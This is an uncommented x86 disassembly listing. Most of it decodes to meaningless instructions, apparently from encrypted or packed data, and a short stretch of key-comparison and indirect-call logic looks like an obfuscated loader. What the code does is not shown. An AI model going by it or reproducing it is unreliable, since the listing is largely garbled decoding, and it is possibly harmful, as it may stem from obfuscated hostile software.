  40f2a7:	sub    DWORD PTR [edx+0xad5482],0xffffffbd
  40f2ae:	pop    esp
  40f2af:	mov    al,ds:0xec481196
  40f2b4:	xor    BYTE PTR [ebp+0xd],cl
  40f2b7:	xchg   ebp,eax
  40f2b8:	cli    
  40f2b9:	adc    edx,DWORD PTR ds:0x59656834
  40f2bf:	mov    al,ds:0xd5e7de69
  40f2c4:	jp     0x40f320
  40f2c6:	enter  0x3261,0x43
  40f2ca:	ins    DWORD PTR es:[edi],dx
  40f2cb:	jmp    DWORD PTR [ebx+edx*8]
  40f2ce:	or     al,0x74
  40f2d0:	add    DWORD PTR [ebx-0x45b013df],ebp
  40f2d6:	mov    ecx,0xbd7cb182
  40f2db:	push   ebx
  40f2dc:	add    esp,0x237a9739
  40f2e2:	dec    edx
  40f2e3:	loop   0x40f274
  40f2e5:	mov    ch,0xbc
  40f2e7:	cmp    bh,BYTE PTR [ecx+0x27]
  40f2ea:	pop    ecx
  40f2eb:	xchg   ebp,eax
  40f2ec:	add    eax,0x38445200
  40f2f1:	mov    dh,BYTE PTR [ecx-0x6c9dfe54]
  40f2f7:	stc    
  40f2f8:	jo     0x40f347
  40f2fa:	in     al,dx
  40f2fb:	lock add BYTE PTR [ecx-0x2],bl
  40f2ff:	mov    dl,BYTE PTR [ebx-0x2f6f2dad]
  40f305:	fs or  al,0x9
  40f308:	loopne 0x40f355
  40f30a:	cwde   
  40f30b:	push   0x8df8659a
  40f310:	nop
  40f311:	sbb    eax,0x3eeacbcb
  40f316:	mov    cl,0x33
  40f318:	test   al,0xf0
  40f31a:	rcl    BYTE PTR [ecx+ecx*4],cl
  40f31d:	and    al,bh
  40f31f:	mov    cl,0xb
  40f321:	out    0x18,eax
  40f323:	mov    ah,0x12
  40f325:	pop    edi
  40f326:	jmp    0x40f31f
  40f328:	fcomp  QWORD PTR [eax+ebx*1-0x144b38a2]
  40f32f:	or     DWORD PTR [ecx+0x78cdcb7e],ebp
  40f335:	mov    ch,0x69
  40f337:	mov    bl,BYTE PTR [edx-0x384c175b]
  40f33d:	push   edi
  40f33e:	call   0x326467b3
  40f343:	test   DWORD PTR [edi-0x5e10c2d3],esi
  40f349:	loopne 0x40f31e
  40f34b:	or     al,BYTE PTR [ebx-0x6a53114c]
  40f351:	mov    ebp,fs
  40f353:	mov    ds:0xd4287b2d,al
  40f358:	push   edi
  40f359:	pop    edi
  40f35a:	dec    edx
  40f35b:	jp     0x40f2ee
  40f35d:	(bad)
  40f361:	out    dx,eax
  40f362:	popf   
  40f363:	add    eax,0xfeee3773
  40f368:	add    eax,edi
  40f36a:	scas   al,BYTE PTR es:[edi]
  40f36b:	jle    0x40f34c
  40f36d:	and    bh,BYTE PTR [ebx]
  40f36f:	test   al,0x7b
  40f371:	cmp    eax,0x2cce66a4
  40f376:	add    al,0xa
  40f378:	mov    al,ds:0xbd7ca622
  40f37d:	mov    ebx,0xf22abe4c
  40f382:	pop    ecx
  40f383:	test   DWORD PTR [ebx+0x12a0cd66],0xb931282c
  40f38d:	pop    ebp
  40f38e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f38f:	loopne 0x40f31e
  40f391:	lods   eax,DWORD PTR ds:[esi]
  40f392:	stos   DWORD PTR es:[edi],eax
  40f393:	cmp    BYTE PTR [edx-0x20876370],dl
  40f399:	lods   eax,DWORD PTR ds:[esi]
  40f39a:	cdq    
  40f39b:	gs ret 0xb5b
  40f39f:	dec    ecx
  40f3a0:	sbb    eax,0x3f8219e9
  40f3a5:	in     al,0xf0
  40f3a7:	imul   ecx,DWORD PTR [edi+0x53],0xb2da2ca
  40f3ae:	pop    edx
  40f3af:	lea    eax,[edi+0x4d]
  40f3b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3b3:	daa    
  40f3b4:	scas   al,BYTE PTR es:[edi]
  40f3b5:	add    DWORD PTR [ecx+0x77d67560],eax
  40f3bb:	repz cmp esi,edi
  40f3be:	lds    ebx,FWORD PTR [esi+0x38]
  40f3c1:	setnp  BYTE PTR [ebx-0x6fefadb9]
  40f3c8:	fldenv [esi]
  40f3ca:	and    eax,0xd9d6977d
  40f3cf:	add    BYTE PTR ds:0xbd9a1bac,0x53
  40f3d6:	js     0x40f37c
  40f3d8:	push   ds
  40f3d9:	inc    edx
  40f3da:	rcl    BYTE PTR [ecx+edx*8+0x407938a7],0xd8
  40f3e2:	push   ss
  40f3e3:	iret   
  40f3e4:	inc    esi
  40f3e5:	jae    0x40f436
  40f3e7:	or     eax,0xe3d807b8
  40f3ec:	(bad)  
  40f3ed:	in     eax,dx
  40f3ee:	inc    ebx
  40f3ef:	cs loope 0x40f3e4
  40f3f2:	xchg   DWORD PTR [ecx+0x20],eax
  40f3f5:	mov    esi,0xd739680
  40f3fa:	dec    ebp
  40f3fb:	aam    0x97
  40f3fd:	inc    esp
  40f3fe:	or     cl,BYTE PTR [ebp-0x119a9c51]
  40f404:	popa   
  40f405:	outs   dx,DWORD PTR ds:[esi]
  40f406:	sar    edx,1
  40f408:	in     al,0x7f
  40f40a:	add    BYTE PTR [ebx-0x2bb38c4a],dl
  40f410:	mov    cs,WORD PTR [esi+0x69]
  40f413:	shl    DWORD PTR [edx+0x7131ce80],1
  40f419:	pop    es
  40f41a:	mov    al,0x68
  40f41c:	iret   
  40f41d:	push   cs
  40f41e:	and    dh,BYTE PTR [eax-0x42a8307]
  40f424:	lahf   
  40f425:	retf   0x21
  40f428:	lock dec ebx
  40f42a:	and    BYTE PTR [edx-0x504240fa],ah
  40f430:	ja     0x40f42c
  40f432:	stc    
  40f433:	nop
  40f434:	in     al,dx
  40f435:	xor    ch,BYTE PTR [ebx-0x71f82f78]
  40f43b:	add    ecx,esi
  40f43d:	sbb    eax,0x24b3bb36
  40f442:	test   ch,0xc5
  40f445:	add    esp,edi
  40f447:	adc    esp,edx
  40f449:	cmp    DWORD PTR [edi-0x2a],eax
  40f44c:	nop
  40f44d:	lahf   
  40f44e:	pop    ebp
  40f44f:	call   0xdcbf:0xad4ce19a
  40f456:	stos   BYTE PTR es:[edi],al
  40f457:	or     al,0x9e
  40f459:	dec    eax
  40f45a:	pop    ebx
  40f45b:	or     esi,DWORD PTR [edi-0x5f]
  40f45e:	xchg   BYTE PTR ds:0xe928bcf8,dl
  40f464:	lahf   
  40f465:	ror    DWORD PTR [ecx-0x6ca4460f],1
  40f46b:	out    0x58,al
  40f46d:	std    
  40f46e:	aaa    
  40f46f:	outs   dx,DWORD PTR ds:[esi]
  40f470:	int3   
  40f471:	mov    ds:0x3e2bcf5e,eax
  40f476:	outs   dx,BYTE PTR ds:[esi]
  40f477:	add    cl,BYTE PTR [ebx-0x66]
  40f47a:	pop    ebp
  40f47b:	xchg   ebx,eax
  40f47c:	inc    ecx
  40f47d:	push   es
  40f47e:	mov    eax,0xdfdc7932
  40f483:	outs   dx,BYTE PTR ds:[esi]
  40f484:	xor    eax,DWORD PTR [ebx]
  40f486:	retf   0xc014
  40f489:	sub    DWORD PTR [eax],ebp
  40f48b:	add    esi,edi
  40f48d:	and    ebx,edx
  40f48f:	lods   eax,DWORD PTR ds:[esi]
  40f490:	sub    eax,0xdeed118e
  40f495:	fs icebp 
  40f497:	ja     0x40f42c
  40f499:	mov    esp,DWORD PTR [eax]
  40f49b:	pop    ds
  40f49c:	rcl    BYTE PTR [eax+0x27],0xcf
  40f4a0:	jmp    0xec91:0x33423c1d
  40f4a7:	out    0x81,al
  40f4a9:	mov    dl,BYTE PTR [esi]
  40f4ab:	pop    ebp
  40f4ac:	ins    DWORD PTR es:[edi],dx
  40f4ad:	stc    
  40f4ae:	pop    esp
  40f4af:	enter  0xb6c8,0xea
  40f4b3:	pusha  
  40f4b4:	jmp    0x464f26fc
  40f4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4ba:	fstp   QWORD PTR [edi-0x45]
  40f4bd:	mov    ah,0xa1
  40f4bf:	int    0x78
  40f4c1:	aaa    
  40f4c2:	mov    gs,WORD PTR [ebx+0x63fcbd37]
  40f4c8:	inc    ecx
  40f4c9:	pop    edx
  40f4ca:	std    
  40f4cb:	or     BYTE PTR [ebp-0x5919d74f],dl
  40f4d1:	in     eax,0xab
  40f4d3:	mov    ds:0x41522916,al
  40f4d8:	pusha  
  40f4d9:	jmp    0x40f48b
  40f4db:	std    
  40f4dc:	iret   
  40f4dd:	fiadd  WORD PTR [ecx-0x547f8699]
  40f4e3:	ins    BYTE PTR es:[edi],dx
  40f4e4:	mov    ecx,0x2fe39c7c
  40f4e9:	hlt    
  40f4ea:	sub    DWORD PTR ds:0xb8515104,ecx
  40f4f0:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  40f4f6:	cld    
  40f4f7:	test   DWORD PTR ss:[eax+edi*8+0x45fb05c7],ebx
  40f4ff:	inc    ebx
  40f500:	add    BYTE PTR [eax+0x56000036],ah
  40f506:	mov    ecx,DWORD PTR ds:0x43460b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x4345d3,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x4345ff,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x43453f,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43458b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi+0x43]
  40f561:	or     al,0x19
  40f563:	fistp  DWORD PTR [esi-0xb81814f]
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f59f
  40f56d:	sbb    DWORD PTR [edi+0x2b0484da],ebx
  40f573:	cli    
  40f574:	fwait
  40f575:	mov    esp,0x918e3f0c
  40f57a:	pop    ss
  40f57b:	ror    DWORD PTR [eax-0x61],0x62
  40f57f:	sub    DWORD PTR [esi],edi
  40f581:	or     dh,dl
  40f583:	dec    eax
  40f584:	and    DWORD PTR [ecx-0x7c28cde4],ebx
  40f58a:	in     eax,0x34
  40f58c:	je     0x40f59e
  40f58e:	push   eax
  40f58f:	xlat   BYTE PTR ds:[ebx]
  40f590:	ret    
  40f591:	dec    eax
  40f592:	push   esp
  40f593:	in     al,0xf3
  40f595:	mov    eax,ds:0x2b2719f9
  40f59a:	xchg   edi,esp
  40f59c:	push   0xffffffc0
  40f59e:	pop    es
  40f59f:	push   ecx
  40f5a0:	or     BYTE PTR [ecx+0x2f],bh
  40f5a3:	push   ebp
  40f5a4:	jnp    0x40f55a
  40f5a6:	push   ds
  40f5a7:	cmp    al,dh
  40f5a9:	lahf   
  40f5aa:	mov    dh,0xdb
  40f5ac:	sub    DWORD PTR [edi],0xf27a79d0
  40f5b2:	fist   DWORD PTR [ecx]
  40f5b4:	loop   0x40f624
  40f5b6:	adc    edi,DWORD PTR [ebx-0x52]
  40f5b9:	xor    DWORD PTR [edi-0x6e],ecx
  40f5bc:	push   ebx
  40f5bd:	push   cs
  40f5be:	int3   
  40f5bf:	rcl    BYTE PTR [eax-0x34287708],0xd1
  40f5c6:	mov    eax,ds:0x786897f4
  40f5cb:	lods   al,BYTE PTR ds:[si]
  40f5cd:	cmp    ebp,DWORD PTR [edx+0x1c9fc1ec]
  40f5d3:	es push edx
  40f5d5:	dec    esi
  40f5d6:	xchg   esi,eax
  40f5d7:	jge    0x40f61c
  40f5d9:	stos   BYTE PTR es:[edi],al
  40f5da:	or     bl,BYTE PTR [esi]
  40f5dc:	fdivp  st(7),st
  40f5de:	jno    0x40f5b9
  40f5e0:	test   eax,0x4aedec40
  40f5e5:	cmp    ch,BYTE PTR [edx+edi*2]
  40f5e8:	sbb    al,0xcc
  40f5ea:	add    eax,0xbfc78ff8
  40f5ef:	inc    ebx
  40f5f0:	add    esp,ebp
  40f5f2:	outs   dx,BYTE PTR ds:[esi]
  40f5f3:	mov    BYTE PTR [ecx+0x33],bh
  40f5f6:	gs mov ch,0xd2
  40f5f9:	retf   
  40f5fa:	imul   ecx,DWORD PTR [eax],0x17d2a0e6
  40f600:	scas   eax,DWORD PTR es:[edi]
  40f601:	mul    BYTE PTR [edi+0x2d]
  40f604:	outs   dx,DWORD PTR ds:[esi]
  40f605:	jne    0x40f64a
  40f607:	(bad)  
  40f608:	fwait
  40f609:	paddsb mm4,QWORD PTR [ebx-0x4618ea5d]
  40f610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f611:	iret   
  40f612:	adc    ecx,ecx
  40f614:	xchg   ebp,eax
  40f615:	stc    
  40f616:	or     dl,BYTE PTR [esi+0x37]
  40f619:	push   ecx
  40f61a:	push   ds
  40f61b:	adc    DWORD PTR [esi-0x8],0xffffff87
  40f61f:	std    
  40f620:	icebp  
  40f621:	pop    ebp
  40f622:	cmp    bh,BYTE PTR [ecx]
  40f624:	lahf   
  40f625:	pop    ecx
  40f626:	in     al,0xe9
  40f628:	dec    DWORD PTR [ebp-0x3e]
  40f62b:	jns    0x40f5ca
  40f62d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f62e:	test   DWORD PTR [edx-0x16f438cc],eax
  40f634:	es inc edx
  40f636:	add    ch,BYTE PTR [esi]
  40f638:	call   0x9a3e:0x478c52eb
  40f63f:	(bad)  
  40f640:	call   0x3b596d7c
  40f645:	adc    BYTE PTR [ebx-0x165c7e60],al
  40f64b:	cmp    dl,BYTE PTR [edi]
  40f64d:	imul   ebp,DWORD PTR [edi+0x4],0x4b97096c
  40f654:	jge    0x40f632
  40f656:	jno    0x40f5da
  40f658:	shr    DWORD PTR [edi],1
  40f65a:	mov    eax,0x885694ca
  40f65f:	mov    edx,0x985d9251
  40f664:	mov    ah,0xb1
  40f666:	int3   
  40f667:	fcom   QWORD PTR [edi]
  40f669:	cmp    DWORD PTR [edx],esp
  40f66b:	not    BYTE PTR [esi-0x6a]
  40f66e:	lock je 0x40f623
  40f671:	cs add eax,0xc634604c
  40f677:	test   DWORD PTR [eax-0x3fc1ecf7],ecx
  40f67d:	lds    eax,FWORD PTR [edi+0x205ab97f]
  40f683:	aam    0x3d
  40f685:	push   es
  40f686:	lea    ebx,[esi+0x6b5c01b5]
  40f68c:	int    0x92
  40f68e:	in     eax,0x28
  40f690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f691:	dec    ecx
  40f692:	xchg   BYTE PTR [esi-0x50a9e44c],dl
  40f698:	push   ebp
  40f699:	cld    
  40f69a:	jp     0x40f65c
  40f69c:	add    eax,0x86255ce
  40f6a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6a2:	mov    ds:0xed9d67bb,al
  40f6a7:	mov    edx,0x895391b5
  40f6ac:	jmp    0x9b2a85a
  40f6b1:	out    0x1b,al
  40f6b3:	mov    dl,BYTE PTR [eax+ebx*1+0x78]
  40f6b7:	fild   DWORD PTR [esi-0x41c1811d]
  40f6bd:	shl    DWORD PTR [edx-0x59457d24],cl
  40f6c3:	imul   eax,DWORD PTR [ebx-0x17],0x36
  40f6c7:	lds    ebp,FWORD PTR [ebp+0x2a]
  40f6ca:	mov    eax,ds:0x24fd4ab8
  40f6cf:	mov    esi,0x448b1eab
  40f6d4:	sub    eax,0xb6ffa0e1
  40f6d9:	mov    DWORD PTR [ebx+ebx*2],0x2636c5ba
  40f6e0:	loop   0x40f758
  40f6e2:	mov    edx,0xdbe9f306
  40f6e7:	cmp    edi,DWORD PTR [esi]
  40f6e9:	int    0x2d
  40f6eb:	sub    ecx,eax
  40f6ed:	ja     0x40f755
  40f6ef:	adc    al,ch
  40f6f1:	and    eax,0x2836f206
  40f6f6:	sbb    dl,BYTE PTR [ebp+ebp*1+0xf]
  40f6fa:	iret   
  40f6fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6fc:	arpl   WORD PTR [ebp-0x8],cx
  40f6ff:	in     al,0x34
  40f701:	hlt    
  40f702:	retf   0x89ed
  40f705:	pop    ecx
  40f706:	sbb    al,0xce
  40f708:	rcl    DWORD PTR [esi],0xa2
  40f70b:	mov    ?,esp
  40f70d:	stos   DWORD PTR es:[edi],eax
  40f70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f70f:	mov    ch,0x96
  40f711:	lods   al,BYTE PTR ds:[esi]
  40f712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f713:	jmp    0x40f6dd
  40f715:	push   ecx
  40f716:	mul    bl
  40f718:	in     eax,dx
  40f719:	jg     0x40f701
  40f71b:	shl    DWORD PTR [edi],cl
  40f71d:	rol    DWORD PTR [ebx],0x53
  40f720:	imul   ecx,DWORD PTR [edi],0xefe136a4
  40f726:	or     al,BYTE PTR [edi+ecx*1-0x71]
  40f72a:	push   edx
  40f72b:	sub    BYTE PTR [edi],cl
  40f72d:	mov    al,ds:0x55730a44
  40f732:	daa    
  40f733:	dec    edx
  40f734:	outs   dx,DWORD PTR ds:[esi]
  40f735:	(bad)  [eax-0x62]
  40f738:	mov    ds:0x5983d98a,eax
  40f73d:	jmp    0x40f71b
  40f73f:	popf   
  40f740:	rcr    DWORD PTR [edx+edx*2+0x780e33c8],1
  40f747:	add    eax,0xbb5c1041
  40f74c:	pushf  
  40f74d:	shr    BYTE PTR [edx],1
  40f74f:	push   ecx
  40f750:	rcl    DWORD PTR [edi],1
  40f752:	push   ss
  40f753:	pop    edx
  40f754:	dec    esi
  40f755:	dec    ecx
  40f756:	out    0xb7,eax
  40f758:	push   edi
  40f759:	dec    esi
  40f75b:	aas    
  40f75c:	or     cl,bh
  40f75e:	adc    edi,DWORD PTR [ebp+0x74cfaeb4]
  40f764:	into   
  40f765:	retf   
  40f766:	sbb    BYTE PTR [si],dh
  40f769:	pop    ds
  40f76a:	dec    edi
  40f76b:	xor    dl,ch
  40f76d:	pop    ecx
  40f76f:	ja     0x40f753
  40f771:	fsub   QWORD PTR [eax+0x3598c6bd]
  40f777:	aas    
  40f778:	jne    0x40f7a5
  40f77a:	mov    cl,0xc4
  40f77c:	sub    ah,bl
  40f77e:	jp     0x40f77e
  40f780:	push   cs
  40f781:	inc    ebp
  40f782:	xchg   edi,eax
  40f783:	call   0x465f0d29
  40f788:	retf   
  40f789:	mov    esp,DWORD PTR [ebx-0x47357cd1]
  40f78f:	idiv   eax
  40f791:	sbb    esi,esi
  40f793:	fmul   DWORD PTR ds:[ecx+0x20]
  40f797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f798:	jae    0x40f7fe
  40f79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f79b:	inc    esi
  40f79c:	je     0x40f768
  40f79e:	pop    edi
  40f79f:	xchg   ecx,eax
  40f7a0:	les    esp,FWORD PTR [edx-0x42a531a6]
  40f7a6:	jmp    0x40f812
  40f7a8:	sub    eax,ecx
  40f7aa:	aad    0x57
  40f7ac:	rcl    bl,0xdf
  40f7af:	retf   0x92f2
  40f7b2:	jo     0x40f779
  40f7b4:	shr    ebx,0x3d
  40f7b7:	and    al,0x2e
  40f7b9:	push   edi
  40f7ba:	or     bx,WORD PTR [ebp+0x5c]
  40f7be:	fstp   QWORD PTR [eax+0x65]
  40f7c1:	mov    al,ds:0xaf630916
  40f7c6:	lods   al,BYTE PTR ds:[esi]
  40f7c7:	mov    esi,0x94395a6e
  40f7cc:	cmp    eax,0x3803510d
  40f7d2:	sahf   
  40f7d3:	add    ch,ch
  40f7d5:	ins    BYTE PTR es:[edi],dx
  40f7d6:	pushf  
  40f7d7:	cmp    edi,DWORD PTR [eax+0x536a868f]
  40f7dd:	inc    esp
  40f7de:	js     0x40f827
  40f7e0:	in     al,0xde
  40f7e2:	ins    DWORD PTR es:[edi],dx
  40f7e3:	add    ebx,DWORD PTR [esi-0x5843d1e5]
  40f7e9:	(bad)  
  40f7ea:	dec    esi
  40f7eb:	pusha  
  40f7ec:	xor    bl,BYTE PTR [edx+0x447e55e7]
  40f7f2:	add    dh,BYTE PTR [esp+eax*8-0x18319146]
  40f7f9:	(bad)  
  40f7fa:	push   cs
  40f7fb:	stos   BYTE PTR es:[edi],al
  40f7fc:	lock fwait
  40f7fe:	push   edi
  40f7ff:	bound  esp,QWORD PTR [ebx]
  40f801:	das    
  40f802:	inc    ecx
  40f803:	imul   esi,DWORD PTR [edx+ebp*1]
  40f807:	ret    0xab7e
  40f80a:	es enter 0xb1fe,0x96
  40f80f:	mov    BYTE PTR [eax],bl
  40f811:	int3   
  40f812:	xchg   esp,eax
  40f813:	mov    edi,eax
  40f815:	sub    esp,DWORD PTR [ebx-0xc]
  40f818:	adc    DWORD PTR [eax],ebp
  40f81a:	(bad)  
  40f81b:	repz mov dl,0x36
  40f81e:	dec    edx
  40f81f:	mov    esi,0x30b6a32c
  40f824:	fstp   TBYTE PTR [eax]
  40f826:	push   esp
  40f827:	xchg   ecx,eax
  40f828:	sub    BYTE PTR [esp+eax*8-0x34],bl
  40f82c:	jbe    0x40f873
  40f82e:	inc    esp
  40f82f:	lea    edx,[edx]
  40f831:	inc    edi
  40f832:	xchg   edx,eax
  40f833:	retf   0x3f55
  40f836:	out    0x91,al
  40f838:	xor    al,0x89
  40f83a:	shr    BYTE PTR [ebp-0x6bb0c492],0x9a
  40f841:	jno    0x40f892
  40f843:	jp     0x40f86b
  40f845:	sub    DWORD PTR [edi],0x66
  40f848:	dec    ebx
  40f849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f84a:	sbb    DWORD PTR [edx+eax*8],esi
  40f84d:	jmp    0x40f7fb
  40f84f:	push   es
  40f850:	dec    ebp
  40f851:	pop    edx
  40f852:	or     DWORD PTR [edx-0x322c6e93],edx
  40f858:	add    eax,0xdc5f2c80
  40f85d:	jae    0x40f8d8
  40f85f:	scas   al,BYTE PTR es:[edi]
  40f860:	repz inc ecx
  40f862:	popa   
  40f863:	pop    esi
  40f864:	retf   0x9e30
  40f867:	dec    ebx
  40f868:	mov    esi,0x16344ec0
  40f86d:	jo     0x40f814
  40f86f:	pop    es
  40f870:	out    dx,al
  40f871:	xchg   ebx,eax
  40f872:	sub    eax,0x36898cba
  40f877:	fwait
  40f878:	loopne 0x40f80b
  40f87a:	xor    al,0xe7
  40f87c:	push   es
  40f87d:	(bad)  
  40f87e:	repnz xchg ecx,eax
  40f880:	rol    DWORD PTR [eax],1
  40f882:	fstp   TBYTE PTR [edx]
  40f884:	add    bh,BYTE PTR [esi]
  40f886:	retf   0xf55f
  40f889:	out    dx,eax
  40f88a:	sbb    al,0xd2
  40f88c:	scas   al,BYTE PTR es:[edi]
  40f88d:	mov    eax,0xe5480097
  40f892:	push   esp
  40f893:	dec    esp
  40f894:	jo     0x40f83d
  40f896:	mov    esp,esp
  40f898:	xchg   edx,eax
  40f899:	sbb    al,0xba
  40f89b:	repz (bad) 
  40f89d:	sahf   
  40f89e:	daa    
  40f89f:	push   ebx
  40f8a0:	or     bh,BYTE PTR [esi]
  40f8a2:	fwait
  40f8a3:	push   0x27
  40f8a5:	out    dx,al
  40f8a6:	jb     0x40f8bd
  40f8a8:	sub    bl,dh
  40f8aa:	pop    ds
  40f8ab:	mov    esi,0x534e6e86
  40f8b0:	mov    ds:0x47ab8228,eax
  40f8b5:	ds scas eax,DWORD PTR es:[edi]
  40f8b7:	mov    dl,BYTE PTR [edi]
  40f8b9:	push   edi
  40f8ba:	pop    ss
  40f8bb:	sti    
  40f8bc:	xor    esp,esi
  40f8be:	mov    dl,0x49
  40f8c0:	mov    DWORD PTR [eax+0x743bf02],esp
  40f8c6:	mov    ?,WORD PTR [eax+ecx*1+0x25abd92b]
  40f8cd:	xchg   ebx,eax
  40f8ce:	jmp    0xe88e9e4d
  40f8d3:	sahf   
  40f8d4:	pop    ebx
  40f8d5:	add    eax,DWORD PTR [ebx-0x3a49ca3c]
  40f8db:	ror    BYTE PTR [ebx+0x44],0x22
  40f8df:	sbb    al,0xd3
  40f8e1:	dec    eax
  40f8e2:	mov    eax,DWORD PTR [ebp-0x4]
  40f8e5:	mov    ecx,DWORD PTR [ebp+0xc]
  40f8e8:	xor    DWORD PTR ds:0x43453f,0x4345cf
  40f8f2:	xor    eax,edi
  40f8f4:	add    eax,esi
  40f8f6:	mov    DWORD PTR ds:0x43458b,0x4bab
  40f900:	cmp    eax,ecx
  40f902:	mov    DWORD PTR ds:0x43460f,0x3e53
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434593,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x4344eb
  40f921:	xor    DWORD PTR ds:0x434553,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x4345bf,0x0
  40f933:	mov    edx,DWORD PTR ds:0x4345bf
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x4345bf,edx
  40f940:	cmp    DWORD PTR ds:0x4345bf,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x43454b
  40f952:	push   0x434692
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x4345bf,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x4345bf
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x4345bf,edx
  40f986:	cmp    DWORD PTR ds:0x4345bf,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x4345bf,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	fldenv [ecx+eiz*8+0x7ebd141c]
  40f9c0:	jle    0x40f9b6
  40f9c2:	jns    0x40fa42
  40f9c4:	jle    0x40fa31
  40f9c6:	xor    al,0xfd
  40f9c8:	mov    esp,0xa73d2543
  40f9cd:	adc    al,dl
  40f9cf:	mov    al,ds:0x34588c8
  40f9d4:	jb     0x40f9f5
  40f9d6:	jnp    0x40f965
  40f9d8:	or     eax,0xe2620da5
  40f9dd:	cmp    al,0x85
  40f9df:	pop    ecx
  40f9e0:	sbb    BYTE PTR [esi+0x348d9019],ah
  40f9e6:	imul   esi,DWORD PTR ds:0xdcbc3e29,0x2e7858a5
  40f9f0:	enter  0x5eba,0x71
  40f9f4:	sub    edx,DWORD PTR [edi+esi*4+0x5c]
  40f9f8:	leave  
  40f9f9:	je     0x40f982
  40f9fb:	mov    WORD PTR [edx],cs
  40f9fd:	cld    
  40f9fe:	mov    ds:0x4c577411,eax
  40fa03:	jl     0x40f9d9
  40fa05:	sbb    esi,DWORD PTR [edi+0x5]
  40fa08:	cmp    ecx,DWORD PTR [ecx+0x6c1adeec]
  40fa0e:	test   DWORD PTR [eax+0x4b],ecx
  40fa11:	fs retf 
  40fa13:	inc    ebx
  40fa14:	inc    eax
  40fa15:	xchg   ebx,eax
  40fa16:	mov    ebp,0x9eae7b4e
  40fa1b:	push   ebx
  40fa1d:	scas   al,BYTE PTR es:[edi]
  40fa1e:	mov    gs,WORD PTR [edi+esi*2-0x5a2c5dd6]
  40fa25:	(bad)  
  40fa26:	(bad)  
  40fa27:	clc    
  40fa28:	adc    ah,BYTE PTR [ecx+0x39]
  40fa2b:	pusha  
  40fa2c:	pop    edi
  40fa2d:	test   BYTE PTR ds:0xf554578f,ch
  40fa33:	sub    al,cl
  40fa35:	bnd ds jne 0x40fa02
  40fa39:	div    cl
  40fa3b:	aas    
  40fa3c:	rcl    BYTE PTR [ecx],cl
  40fa3e:	sar    BYTE PTR [esi-0x6f091ff3],0xc
  40fa45:	push   ebp
  40fa46:	dec    eax
  40fa47:	(bad)  
  40fa48:	mov    edx,0x5fd454aa
  40fa4d:	push   eax
  40fa4e:	nop
  40fa4f:	fistp  WORD PTR cs:[eax-0x198ae683]
  40fa56:	add    ah,BYTE PTR [ebx-0x43]
  40fa59:	xor    al,dl
  40fa5b:	popf   
  40fa5c:	int    0x83
  40fa5e:	sub    al,0xaa
  40fa60:	jmp    0x2e38:0xe36bd81a
  40fa67:	add    al,0xa1
  40fa69:	popa   
  40fa6a:	push   ecx
  40fa6b:	xor    eax,esi
  40fa6d:	mov    eax,ds:0x6497f154
  40fa72:	mov    ds:0x62270fc0,al
  40fa77:	cmc    
  40fa78:	lds    esi,FWORD PTR [eax-0x17316750]
  40fa7e:	fmul   QWORD PTR [edi+edx*4+0x4a]
  40fa82:	ss pop ds
  40fa84:	enter  0x85f7,0xd9
  40fa88:	pop    ebx
  40fa89:	popf   
  40fa8a:	pop    ebx
  40fa8b:	aad    0xdb
  40fa8d:	dec    esi
  40fa8e:	cs rol dh,0xf5
  40fa92:	dec    ebp
  40fa93:	mov    ecx,DWORD PTR [eax-0x40]
  40fa96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa97:	mov    bl,0x33
  40fa99:	adc    DWORD PTR [ebx-0x1b],edx
  40fa9c:	out    0x6c,al
